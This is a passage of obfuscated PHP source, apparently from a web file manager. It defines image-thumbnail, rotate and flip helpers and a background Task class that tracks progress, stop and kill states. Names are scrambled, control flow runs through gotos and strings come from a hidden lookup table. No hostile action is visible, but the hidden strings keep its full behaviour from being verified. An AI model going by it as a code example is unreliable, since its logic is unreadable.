<?php
 goto Cšìé®ã‚; cÀÂÒôÔº·: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($C²‹ñã‡¹Ò, $Cİ¬®£µÜ¸) { goto eñ¯ó‰—¾ğ; eñ¯ó‰—¾ğ: $this->srcFile = $C²‹ñã‡¹Ò; $this->echoType = $Cİ¬®£µÜ¸; $this->im = self::image($C²‹ñã‡¹Ò); goto a˜ÔÉÃÍÙŠ; a˜ÔÉÃÍÙŠ: if (!$this->im) { return !1; } $aôÜÁİÓÜ« = $_SERVER[¶ªÕß‚ØÁŸ][33]; $this->imgData = GetImageSize($C²‹ñã‡¹Ò, $aôÜÁİÓÜ«); goto cã•’¦ßÉ; cã•’¦ßÉ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto Có‘Ù‘ÆÍâ; Có‘Ù‘ÆÍâ: } public static function image($D÷ˆòšİ·­) { $fß‡ë‘ˆ‚ò =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÈù¯¢Ö = $fß‡ë‘ˆ‚ò[33]; $eËñÕò´÷Ì = GetImageSize($D÷ˆòšİ·­, $FÈù¯¢Ö); $F¤šã—÷ƒ = !1; switch ($eËñÕò´÷Ì[2]) { case IMAGETYPE_GIF: if (!function_exists($fß‡ë‘ˆ‚ò[1867])) { break; } $F¤šã—÷ƒ = imagecreatefromgif($D÷ˆòšİ·­); break; case IMAGETYPE_JPEG: if (!function_exists($fß‡ë‘ˆ‚ò[1868])) { break; } $F¤šã—÷ƒ = imagecreatefromjpeg($D÷ˆòšİ·­); break; case IMAGETYPE_PNG: if (!function_exists($fß‡ë‘ˆ‚ò[1869])) { break; } $F¤šã—÷ƒ = @imagecreatefrompng($D÷ˆòšİ·­); imagesavealpha($F¤šã—÷ƒ, !0); break; case IMAGETYPE_XBM: $F¤šã—÷ƒ = imagecreatefromxbm($D÷ˆòšİ·­); break; case IMAGETYPE_WBMP: $F¤šã—÷ƒ = imagecreatefromwbmp($D÷ˆòšİ·­); break; case IMAGETYPE_BMP: $F¤šã—÷ƒ = imagecreatefrombmp($D÷ˆòšİ·­); break; default: break; } return $F¤šã—÷ƒ; } public static function imageSize($DÒÜ‰Ê‰ªœ) { $e‡ÉàÈ²Õ =& $_SERVER[¶ªÕß‚ØÁŸ]; $AÅùìà­ÎÇ = GetImageSize($DÒÜ‰Ê‰ªœ); if (!$AÅùìà­ÎÇ) { return !1; } return array($e‡ÉàÈ²Õ[1870] => $AÅùìà­ÎÇ[0], $e‡ÉàÈ²Õ[1871] => $AÅùìà­ÎÇ[1]); } function distortion($BÁÕŒÖ¢ç, $BÖÅ©¼¬Ù, $EˆÕô‹ñÏĞ) { $dËƒÄÚßÑ = $this->creatImage($this->im, $BÖÅ©¼¬Ù, $EˆÕô‹ñÏĞ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($dËƒÄÚßÑ, $BÁÕŒÖ¢ç); } function prorate($Bä¹ÖõŠËœ, $Eœ…ªéø‹ƒ, $dÃ¡ òœåÜ) { $aùŞç“†‰° = $Eœ…ªéø‹ƒ / $dÃ¡ òœåÜ; $EÀ·½Ç†” = $this->srcW / $this->srcH; if ($aùŞç“†‰° <= $EÀ·½Ç†”) { $fêËìóøù‚ = $Eœ…ªéø‹ƒ; $C ½Úæ´ë = $fêËìóøù‚ * ($this->srcH / $this->srcW); } else { $C ½Úæ´ë = $dÃ¡ òœåÜ; $fêËìóøù‚ = $C ½Úæ´ë * ($this->srcW / $this->srcH); } if ($this->srcW > $Eœ…ªéø‹ƒ || $this->srcH > $dÃ¡ òœåÜ) { $D“ÔøáêŸ = $this->creatImage($this->im, $fêËìóøù‚, $C ½Úæ´ë, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($D“ÔøáêŸ, $Bä¹ÖõŠËœ); } else { $D“ÔøáêŸ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($D“ÔøáêŸ, $Bä¹ÖõŠËœ); } } function cut($a‹„¸¼ŸØÛ, $dá„„ÙÈ‘Ğ, $CÌÔÖÏ‹ä) { goto E¼›íÔ°ö; E¼›íÔ°ö: $EÏ–©›â® = $dá„„ÙÈ‘Ğ / $CÌÔÖÏ‹ä; $DÃÎ—·® = $this->srcW / $this->srcH; if ($EÏ–©›â® <= $DÃÎ—·®) { $a°ÇôÖ¬Ï = $CÌÔÖÏ‹ä; $d¶–ƒ‰†Í = $a°ÇôÖ¬Ï * ($this->srcW / $this->srcH); } else { $d¶–ƒ‰†Í = $dá„„ÙÈ‘Ğ; $a°ÇôÖ¬Ï = $d¶–ƒ‰†Í * ($this->srcH / $this->srcW); } goto DõÇÈÓò®ß; E±ôÕ‹â­: return $this->echoImage($B„–âÀŞ…ğ, $a‹„¸¼ŸØÛ); goto dò‰¤­º¼; DõÇÈÓò®ß: $D™‘¼±Ïê» = $this->creatImage($this->im, $d¶–ƒ‰†Í, $a°ÇôÖ¬Ï, 0, 0, 0, 0, $this->srcW, $this->srcH); $B„–âÀŞ…ğ = $this->creatImage($D™‘¼±Ïê», $dá„„ÙÈ‘Ğ, $CÌÔÖÏ‹ä, 0, 0, ($d¶–ƒ‰†Í - $dá„„ÙÈ‘Ğ) / 2, ($a°ÇôÖ¬Ï - $CÌÔÖÏ‹ä) / 2, $dá„„ÙÈ‘Ğ, $CÌÔÖÏ‹ä); imageDestroy($D™‘¼±Ïê»); goto E±ôÕ‹â­; dò‰¤­º¼: } function backFill($a¤®î‡¦ã, $AÛß‘í°, $f£Îˆ¡È×, $dÓµ¢óØäô = false, $a¬»ÇÜ¦® = 255, $FĞÒ—¦à¢Æ = 255, $Dì¦öÙ×·‚ = 255) { goto fÅ±Æãµƒ¶; bÁƒéç¡Ï§: if ($dÓµ¢óØäô) { $a­”‰²ÇÈ³ = imageColorTransparent($CÛò—äÉäÖ, $a­”‰²ÇÈ³); $A¶¤îäïÜ— = $f£Îˆ¡È× - $aà…íÚŒà·; } imageFilledRectangle($CÛò—äÉäÖ, 0, 0, $AÛß‘í°, $f£Îˆ¡È×, $a­”‰²ÇÈ³); if ($this->srcW > $AÛß‘í° || $this->srcH > $f£Îˆ¡È×) { $f‰©…×ŞøŒ = $this->creatImage($this->im, $Døö¶øÃÒ, $aà…íÚŒà·, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($Døö¶øÃÒ < $AÛß‘í°) { imageCopy($CÛò—äÉäÖ, $f‰©…×ŞøŒ, ($AÛß‘í° - $Døö¶øÃÒ) / 2, 0, 0, 0, $Døö¶øÃÒ, $aà…íÚŒà·); } else { if ($aà…íÚŒà· < $f£Îˆ¡È×) { imageCopy($CÛò—äÉäÖ, $f‰©…×ŞøŒ, 0, $A¶¤îäïÜ—, 0, 0, $Døö¶øÃÒ, $aà…íÚŒà·); } else { imageCopy($CÛò—äÉäÖ, $f‰©…×ŞøŒ, 0, 0, 0, 0, $Døö¶øÃÒ, $aà…íÚŒà·); } } } else { imageCopyMerge($CÛò—äÉäÖ, $this->im, ($AÛß‘í° - $Døö¶øÃÒ) / 2, $A¶¤îäïÜ—, 0, 0, $Døö¶øÃÒ, $aà…íÚŒà·, 100); } goto DÓ×‰ç¸ê¾; DÓ×‰ç¸ê¾: return $this->echoImage($CÛò—äÉäÖ, $a¤®î‡¦ã); goto Eì¥ğñØÈ¿; fÅ±Æãµƒ¶: $AƒƒàÛšÜÔ = $AÛß‘í° / $f£Îˆ¡È×; $aŒÅÈÙÅ¶• = $this->srcW / $this->srcH; if ($AƒƒàÛšÜÔ <= $aŒÅÈÙÅ¶•) { $Døö¶øÃÒ = $AÛß‘í°; $aà…íÚŒà· = $Døö¶øÃÒ * ($this->srcH / $this->srcW); } else { $aà…íÚŒà· = $f£Îˆ¡È×; $Døö¶øÃÒ = $aà…íÚŒà· * ($this->srcW / $this->srcH); } goto cØ‰¦™ìÕ; cØ‰¦™ìÕ: if (function_exists($_SERVER[¶ªÕß‚ØÁŸ][1872])) { @($CÛò—äÉäÖ = imageCreateTrueColor($AÛß‘í°, $f£Îˆ¡È×)); if (!$CÛò—äÉäÖ) { $CÛò—äÉäÖ = imageCreate($AÛß‘í°, $f£Îˆ¡È×); } } else { $CÛò—äÉäÖ = imageCreate($AÛß‘í°, $f£Îˆ¡È×); } $A¶¤îäïÜ— = ($f£Îˆ¡È× - $aà…íÚŒà·) / 2; $a­”‰²ÇÈ³ = imagecolorallocate($CÛò—äÉäÖ, $a¬»ÇÜ¦®, $FĞÒ—¦à¢Æ, $Dì¦öÙ×·‚); goto bÁƒéç¡Ï§; Eì¥ğñØÈ¿: } function creatImage($cÀÃóÉò›, $aÀ¿Œãªâ, $EÚ›Ò…²Ïª, $B°œ„†øÚ, $dæäß® ®„, $b´Ò½ƒÑ, $bà·ïö“†Ã, $AÔ—«Û²Ñ·, $fÁÅ—åâ›ê) { if (function_exists($_SERVER[¶ªÕß‚ØÁŸ][1872])) { @($b²Ó¬íç¶œ = ImageCreateTrueColor($aÀ¿Œãªâ, $EÚ›Ò…²Ïª)); @imagealphablending($b²Ó¬íç¶œ, !1); @imagesavealpha($b²Ó¬íç¶œ, !0); if ($b²Ó¬íç¶œ) { imageCopyResampled($b²Ó¬íç¶œ, $cÀÃóÉò›, $B°œ„†øÚ, $dæäß® ®„, $b´Ò½ƒÑ, $bà·ïö“†Ã, $aÀ¿Œãªâ, $EÚ›Ò…²Ïª, $AÔ—«Û²Ñ·, $fÁÅ—åâ›ê); } else { $b²Ó¬íç¶œ = ImageCreate($aÀ¿Œãªâ, $EÚ›Ò…²Ïª); imageCopyResized($b²Ó¬íç¶œ, $cÀÃóÉò›, $B°œ„†øÚ, $dæäß® ®„, $b´Ò½ƒÑ, $bà·ïö“†Ã, $aÀ¿Œãªâ, $EÚ›Ò…²Ïª, $AÔ—«Û²Ñ·, $fÁÅ—åâ›ê); } } else { $b²Ó¬íç¶œ = ImageCreate($aÀ¿Œãªâ, $EÚ›Ò…²Ïª); imageCopyResized($b²Ó¬íç¶œ, $cÀÃóÉò›, $B°œ„†øÚ, $dæäß® ®„, $b´Ò½ƒÑ, $bà·ïö“†Ã, $aÀ¿Œãªâ, $EÚ›Ò…²Ïª, $AÔ—«Û²Ñ·, $fÁÅ—åâ›ê); } return $b²Ó¬íç¶œ; } public function imgRotate($A¢Ëš½Ğ…, $CÈİÑ´¦¨è) { goto b©‹Ê…—ÕÇ; b©‹Ê…—ÕÇ: if (!$this->im || $CÈİÑ´¦¨è % 360 === 0 || !function_exists($_SERVER[¶ªÕß‚ØÁŸ][1873])) { return !1; } $f¶Í†Ø›… = imageRotate($this->im, 360 - $CÈİÑ´¦¨è, 0); $FµÇ‰¤ŒõÑ = !1; goto EÛñøÜÃµÉ; EÛñøÜÃµÉ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $FµÇ‰¤ŒõÑ = imagegif($f¶Í†Ø›…, $A¢Ëš½Ğ…); break; case IMAGETYPE_JPEG: $FµÇ‰¤ŒõÑ = imagejpeg($f¶Í†Ø›…, $A¢Ëš½Ğ…, 100); break; case IMAGETYPE_PNG: $FµÇ‰¤ŒõÑ = imagePNG($f¶Í†Ø›…, $A¢Ëš½Ğ…); break; default: break; } imageDestroy($f¶Í†Ø›…); imageDestroy($this->im); goto C§ë‹é¡Ä; C§ë‹é¡Ä: return $FµÇ‰¤ŒõÑ; goto E®Ú“§«ùæ; E®Ú“§«ùæ: } function echoImage($DİÌ×‡—Ò™, $c¨—«É½Üè) { goto A“Ğ÷âµÖ‘; A“Ğ÷âµÖ‘: $b©·­æ²¼² =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$DİÌ×‡—Ò™) { return !1; } ob_get_clean(); goto Dê×ØÃî…æ; aĞö·½àŸÓ: imageDestroy($this->im); return $DÄíô£†İ; goto EÆëç—Ú¿ï; Dê×ØÃî…æ: $DÄíô£†İ = !1; switch ($this->echoType) { case $b©·­æ²¼²[1874]: $DÄíô£†İ = imagePNG($DİÌ×‡—Ò™); break; case $b©·­æ²¼²[177]: $DÄíô£†İ = imagePNG($DİÌ×‡—Ò™, $c¨—«É½Üè); break; } imageDestroy($DİÌ×‡—Ò™); goto aĞö·½àŸÓ; EÆëç—Ú¿ï: } } if (!function_exists($_SERVER[¶ªÕß‚ØÁŸ][1875])) { define($_SERVER[¶ªÕß‚ØÁŸ][1876], 0); define($_SERVER[¶ªÕß‚ØÁŸ][1877], 1); define($_SERVER[¶ªÕß‚ØÁŸ][1878], 2); function imageflip($C‡‘¬òíŞ, $FÑôº¼·Èõ) { switch ($FÑôº¼·Èõ) { case IMG_FLIP_HORIZONTAL: $fÈª¾æ»¥ = imagesx($C‡‘¬òíŞ) - 1; $EÇâó¸¨Œ£ = $fÈª¾æ»¥ / 2; $aÀÇ…®¨»ğ = imagesy($C‡‘¬òíŞ); $E§²àÒ‘¡° = imageistruecolor($C‡‘¬òíŞ) ? imagecreatetruecolor(1, $aÀÇ…®¨»ğ) : imagecreate(1, $aÀÇ…®¨»ğ); for ($Dâ®¹á£æÀ = 0; $Dâ®¹á£æÀ < $EÇâó¸¨Œ£; ++$Dâ®¹á£æÀ) { imagecopy($E§²àÒ‘¡°, $C‡‘¬òíŞ, 0, 0, $Dâ®¹á£æÀ, 0, 1, $aÀÇ…®¨»ğ); imagecopy($C‡‘¬òíŞ, $C‡‘¬òíŞ, $Dâ®¹á£æÀ, 0, $fÈª¾æ»¥ - $Dâ®¹á£æÀ, 0, 1, $aÀÇ…®¨»ğ); imagecopy($C‡‘¬òíŞ, $E§²àÒ‘¡°, $fÈª¾æ»¥ - $Dâ®¹á£æÀ, 0, 0, 0, 1, $aÀÇ…®¨»ğ); } break; case IMG_FLIP_VERTICAL: $cÂÊŠµÌèİ = imagesx($C‡‘¬òíŞ); $E‹¡†¨‚ñŠ = imagesy($C‡‘¬òíŞ) - 1; $fĞ‹–ËôîŸ = $E‹¡†¨‚ñŠ / 2; $E§²àÒ‘¡° = imageistruecolor($C‡‘¬òíŞ) ? imagecreatetruecolor($cÂÊŠµÌèİ, 1) : imagecreate($cÂÊŠµÌèİ, 1); for ($aøÓ¾Ş• = 0; $aøÓ¾Ş• < $fĞ‹–ËôîŸ; ++$aøÓ¾Ş•) { imagecopy($E§²àÒ‘¡°, $C‡‘¬òíŞ, 0, 0, 0, $aøÓ¾Ş•, $cÂÊŠµÌèİ, 1); imagecopy($C‡‘¬òíŞ, $C‡‘¬òíŞ, 0, $aøÓ¾Ş•, 0, $E‹¡†¨‚ñŠ - $aøÓ¾Ş•, $cÂÊŠµÌèİ, 1); imagecopy($C‡‘¬òíŞ, $E§²àÒ‘¡°, 0, $E‹¡†¨‚ñŠ - $aøÓ¾Ş•, 0, 0, $cÂÊŠµÌèİ, 1); } break; case IMG_FLIP_BOTH: $cÂÊŠµÌèİ = imagesx($C‡‘¬òíŞ); $aÀÇ…®¨»ğ = imagesy($C‡‘¬òíŞ); $E§²àÒ‘¡° = imagerotate($C‡‘¬òíŞ, 180, 0); imagecopy($C‡‘¬òíŞ, $E§²àÒ‘¡°, 0, 0, 0, 0, $cÂÊŠµÌèİ, $aÀÇ…®¨»ğ); break; default: return; } imagedestroy($E§²àÒ‘¡°); } } if (!function_exists($_SERVER[¶ªÕß‚ØÁŸ][1879])) { function imagecreatefrombmp($fí¼£¦©ø) { return ImageGdBMP::load($fí¼£¦©ø); } } goto e„î®®«ÄÃ; B¡¹ÑÏ±îœ: class Task { const STATYS_STOP = "\x73\164\x6f\160"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\x69\156\x67"; const STATYS_KILL = "\153\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($BøÏ¸˜…³¯, $CÁ¸ª•ÒƒÆ = '', $b’–ˆñŒÑº = 0, $F‘±‹Ÿ…µÔ = '') { goto D©¡¸‚é˜‘; A›¹¨›àõ: Hook::trigger($dŒ†æ¶ÑÄÌ[1451], $this->task); $this->task[$dŒ†æ¶ÑÄÌ[1445]] = timeFloat(); goto cÌé²ğÅ­È; Eè†ƒãöä: Hook::bind($dŒ†æ¶ÑÄÌ[1406], array($this, $dŒ†æ¶ÑÄÌ[1448])); Hook::bind($dŒ†æ¶ÑÄÌ[1449], array($this, $dŒ†æ¶ÑÄÌ[1450])); $this->startAfter(); goto A›¹¨›àõ; D©¡¸‚é˜‘: $dŒ†æ¶ÑÄÌ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (self::get($BøÏ¸˜…³¯)) { return; } $this->task = array($dŒ†æ¶ÑÄÌ[375] => $BøÏ¸˜…³¯, $dŒ†æ¶ÑÄÌ[1440] => USER_ID, $dŒ†æ¶ÑÄÌ[1346] => $F‘±‹Ÿ…µÔ, $dŒ†æ¶ÑÄÌ[29] => $CÁ¸ª•ÒƒÆ, $dŒ†æ¶ÑÄÌ[984] => $dŒ†æ¶ÑÄÌ[33], $dŒ†æ¶ÑÄÌ[982] => $b’–ˆñŒÑº, $dŒ†æ¶ÑÄÌ[994] => 0, $dŒ†æ¶ÑÄÌ[1441] => 0, $dŒ†æ¶ÑÄÌ[1442] => 0, $dŒ†æ¶ÑÄÌ[1443] => timeFloat(), $dŒ†æ¶ÑÄÌ[1444] => 0, $dŒ†æ¶ÑÄÌ[1445] => 0, $dŒ†æ¶ÑÄÌ[1446] => 0, $dŒ†æ¶ÑÄÌ[1447] => 0, $dŒ†æ¶ÑÄÌ[702] => $dŒ†æ¶ÑÄÌ[1404]); goto Eè†ƒãöä; cÌé²ğÅ­È: } public function end() { goto eœ÷Ø¤¶ ; eœ÷Ø¤¶ : $D‰œË…†Ì =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->task) { return; } if ($this->task[$D‰œË…†Ì[1445]]) { self::valueSet($this->task[$D‰œË…†Ì[375]], !1); } goto a¾Èšê—ç; fŞÓìíæ…: Hook::unbind($D‰œË…†Ì[1449], array($this, $D‰œË…†Ì[1450])); $this->endAfter(); $this->task = !1; goto DŠ‘õãÒñ³; a¾Èšê—ç: $C„©…¢Ñò = timeFloat() - $this->task[$D‰œË…†Ì[1443]]; self::log($D‰œË…†Ì[1452] . $this->task[$D‰œË…†Ì[375]] . $D‰œË…†Ì[1453] . $C„©…¢Ñò . $D‰œË…†Ì[1454]); Hook::unbind($D‰œË…†Ì[1406], array($this, $D‰œË…†Ì[1448])); goto fŞÓìíæ…; DŠ‘õãÒñ³: } public function update($F÷Ë³¤¬‹® = 0) { goto f®ëöù›¥º; f®ëöù›¥º: $aÆ¶ÊÌ·¶‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÉÜ„Ú¼¹· =& $this->task; if (!$bÉÜ„Ú¼¹·) { return; } goto C‡ŒÎòÄ²¼; e¾’„½ç: $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[702]] = $Dãõï‘Ø° ? $Dãõï‘Ø° : $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[702]]; $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1446]] = $BÓ“ù†¬Õ»[$aÆ¶ÊÌ·¶‹[1446]] ? $BÓ“ù†¬Õ»[$aÆ¶ÊÌ·¶‹[1446]] : 0; $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1445]] = timeFloat(); goto eß…¤ø†÷; C‡ŒÎòÄ²¼: $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[994]] += $F÷Ë³¤¬‹®; $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1444]] = timeFloat(); if ($bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[982]]) { if ($bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[982]] < $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[994]]) { $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[982]] = $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[994]]; } $Eô„’ôÆ±Ó = timeFloat() - $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1443]] - $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1446]]; $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1441]] = $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[994]] / $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[982]]; $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1442]] = $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[994]] / $Eô„’ôÆ±Ó; if ($bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1441]] > 0) { $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1447]] = $Eô„’ôÆ±Ó * (1 - $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1441]]) / $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1441]]; } $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1447]] = $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1447]] <= 0 ? 0 : $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1447]]; } goto eÛŒ‡¡ºç’; Dß˜±ÜÂä: $BÓ“ù†¬Õ» = self::get($bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[375]]); $Dãõï‘Ø° = $BÓ“ù†¬Õ»[$aÆ¶ÊÌ·¶‹[702]]; if ($Dãõï‘Ø° == self::STATYS_KILL) { $EÁË·šÅÄ = array($aÆ¶ÊÌ·¶‹[1455] => LNG($aÆ¶ÊÌ·¶‹[1456]), $aÆ¶ÊÌ·¶‹[1036] => !1); Cache::set($aÆ¶ÊÌ·¶‹[1457] . $this->task[$aÆ¶ÊÌ·¶‹[375]], $EÁË·šÅÄ, 30); $this->end(); die; } else { if ($Dãõï‘Ø° == self::STATYS_STOP) { $eˆ ×ò§Ş¾ = 2; $BÓ“ù†¬Õ»[$aÆ¶ÊÌ·¶‹[1446]] += $eˆ ×ò§Ş¾; self::valueSet($bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[375]], $BÓ“ù†¬Õ»); sleep($eˆ ×ò§Ş¾); $this->update(); return; } } goto e¾’„½ç; eß…¤ø†÷: Hook::trigger($aÆ¶ÊÌ·¶‹[1458], $bÉÜ„Ú¼¹·); self::valueSet($bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[375]], $bÉÜ„Ú¼¹·); goto DÛÍÎ”àÇ¬; eÛŒ‡¡ºç’: $this->updateAfter(); $fï±‰ÈÒ = 0.2; if (timeFloat() - $bÉÜ„Ú¼¹·[$aÆ¶ÊÌ·¶‹[1445]] < $fï±‰ÈÒ) { return; } goto Dß˜±ÜÂä; DÛÍÎ”àÇ¬: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($cƒÍ×à´Èİ) { $c’à¹òöÓ° =& $_SERVER[¶ªÕß‚ØÁŸ]; Cache::set($c’à¹òöÓ°[1457] . $this->task[$c’à¹òöÓ°[375]], $cƒÍ×à´Èİ, 60); return $cƒÍ×à´Èİ; } public static function get($b»¹¸Ê¹Ì) { return self::valueGet($b»¹¸Ê¹Ì); } public static function listData() { $föŠ¾ìÓÖ = self::valueGet(); return array_sort_by($föŠ¾ìÓÖ, $_SERVER[¶ªÕß‚ØÁŸ][1443], !0); } public static function kill($cø½‡ÜËà) { return self::changeStatus($cø½‡ÜËà, self::STATYS_KILL); } public static function stop($dø´‰çò©Á) { return self::changeStatus($dø´‰çò©Á, self::STATYS_STOP); } public static function restart($FåäÅ×‡¦Ñ) { return self::changeStatus($FåäÅ×‡¦Ñ, self::STATYS_RUNNING); } public static function killAll() { $EÀí¤à²¢ =& $_SERVER[¶ªÕß‚ØÁŸ]; $dƒˆì‹µ¤Í = self::listData(); foreach ($dƒˆì‹µ¤Í as $eñãÎíù÷à) { self::kill($eñãÎíù÷à[$EÀí¤à²¢[375]]); } sleep(2); foreach ($dƒˆì‹µ¤Í as $eñãÎíù÷à) { self::valueSet($eñãÎíù÷à[$EÀí¤à²¢[375]], !1); } } private static function changeStatus($Eº¼–÷¾œÎ, $B‡Øõ¦™­Š) { goto FÇä’èéÆê; FÇä’èéÆê: $e°‘ì‘ê‰é =& $_SERVER[¶ªÕß‚ØÁŸ]; $d ƒ¦ÉŒÈØ = self::valueGet($Eº¼–÷¾œÎ); if (!$d ƒ¦ÉŒÈØ) { return !1; } goto dÇÏ‘öí¬; dÇÏ‘öí¬: $d ƒ¦ÉŒÈØ[$e°‘ì‘ê‰é[702]] = $B‡Øõ¦™­Š; self::valueSet($Eº¼–÷¾œÎ, $d ƒ¦ÉŒÈØ); self::log($e°‘ì‘ê‰é[1459] . $d ƒ¦ÉŒÈØ[$e°‘ì‘ê‰é[375]] . $e°‘ì‘ê‰é[1460] . $B‡Øõ¦™­Š); goto aÈÈùö‘Áµ; aÈÈùö‘Áµ: return !0; goto fÓ£à°—é; fÓ£à°—é: } public static function valueGet($Bº“‹’•§Œ = false) { $fÓƒŒ·åÙª =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($Bº“‹’•§Œ) { $cÏ³ãœì¸ = Model($fÓƒŒ·åÙª[407])->where(array($fÓƒŒ·åÙª[99] => $Bº“‹’•§Œ, $fÓƒŒ·åÙª[29] => $fÓƒŒ·åÙª[1461]))->find(); return $cÏ³ãœì¸ ? json_decode($cÏ³ãœì¸[$fÓƒŒ·åÙª[368]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Dù¦¥¬™äõ = false) { goto F²ÙšŞÃÑŒ; F²ÙšŞÃÑŒ: $cµ”Òœ¡í =& $_SERVER[¶ªÕß‚ØÁŸ]; $aª—Ê¹êÛ = array($cµ”Òœ¡í[29] => $cµ”Òœ¡í[1461]); if ($Dù¦¥¬™äõ) { $aª—Ê¹êÛ[$cµ”Òœ¡í[1440]] = $Dù¦¥¬™äõ; } goto bì—‡‘ÉŒ; D…ƒ‘‘‡ˆ: return $EÑ§‘ôêÚŠ; goto EİÂ»„ïé; bì—‡‘ÉŒ: $EÑ§‘ôêÚŠ = Model($cµ”Òœ¡í[407])->where($aª—Ê¹êÛ)->select(); $EÑ§‘ôêÚŠ = $EÑ§‘ôêÚŠ ? $EÑ§‘ôêÚŠ : array(); foreach ($EÑ§‘ôêÚŠ as $f«Ä¯“—˜ => $a©‚ê‹ÅÒ) { $EÑ§‘ôêÚŠ[$f«Ä¯“—˜] = json_decode($a©‚ê‹ÅÒ[$cµ”Òœ¡í[368]], !0); } goto D…ƒ‘‘‡ˆ; EİÂ»„ïé: } public static function valueSet($f¾¶ªÂäÊ£, $dòìŒ¢×·) { goto B¯²êãÇÓ‰; B¯²êãÇÓ‰: $Eì¡º«æ† =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$dòìŒ¢×·) { return Model($Eì¡º«æ†[407])->where(array($Eì¡º«æ†[99] => $f¾¶ªÂäÊ£, $Eì¡º«æ†[29] => $Eì¡º«æ†[1461]))->delete(); } $FÀŒğÈ¦Ë = json_encode($dòìŒ¢×·); goto cÛ©¥¿ù‚°; cÛ©¥¿ù‚°: if (!$FÀŒğÈ¦Ë) { ob_start(); var_dump($dòìŒ¢×·); $bò†ƒòŒ¦ = ob_get_clean(); self::log($Eì¡º«æ†[1462] . json_encode_force($bò†ƒòŒ¦)); } if (!$f¾¶ªÂäÊ£ || !$dòìŒ¢×·[$Eì¡º«æ†[375]]) { return !1; } $A¯ï ï‘™Ä = array($Eì¡º«æ†[29] => $Eì¡º«æ†[1461], $Eì¡º«æ†[1440] => USER_ID, $Eì¡º«æ†[99] => $f¾¶ªÂäÊ£, $Eì¡º«æ†[368] => $FÀŒğÈ¦Ë); goto BÑ•İ°í; BÑ•İ°í: Model($Eì¡º«æ†[407])->add($A¯ï ï‘™Ä, array(), !0); goto aÜ˜‰ö·ÊÑ; aÜ˜‰ö·ÊÑ: } public static function log($F¼ÉÇÕ¬Öò) { write_log($F¼ÉÇÕ¬Öò, $_SERVER[¶ªÕß‚ØÁŸ][1463]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto F†ˆ–øÍ÷; f·¦Áº³Éé: $e™ííˆè ¿[$Fòˆ“¨˜Òõ[1483]] = LNG($Fòˆ“¨˜Òõ[1484]); $e™ííˆè ¿[$Fòˆ“¨˜Òõ[1485]] = 0; $e™ííˆè ¿[$Fòˆ“¨˜Òõ[1486]] = 0; goto aºÀš„©³ƒ; Fİšøƒëé: Hook::bind($Fòˆ“¨˜Òõ[551], array($this, $Fòˆ“¨˜Òõ[1472])); Hook::bind($Fòˆ“¨˜Òõ[517], array($this, $Fòˆ“¨˜Òõ[1473])); Hook::bind($Fòˆ“¨˜Òõ[514], array($this, $Fòˆ“¨˜Òõ[1473])); goto f¦˜êÛ”î„; b½‡¼ÊÑ¸·: Hook::bind($Fòˆ“¨˜Òõ[1474], array($this, $Fòˆ“¨˜Òõ[1475])); Hook::bind($Fòˆ“¨˜Òõ[540], array($this, $Fòˆ“¨˜Òõ[1476])); $this->sourceModelCopyFlag = !1; goto BçØ¬Œõ; aºÀš„©³ƒ: $e™ííˆè ¿[$Fòˆ“¨˜Òõ[984]] = $Fòˆ“¨˜Òõ[33]; $e™ííˆè ¿[$Fòˆ“¨˜Òõ[1487]] = $Fòˆ“¨˜Òõ[33]; $e™ííˆè ¿[$Fòˆ“¨˜Òõ[1488]] = 0; goto dâŸ‹á×¬Ã; cÕÇœ¯¹•„: 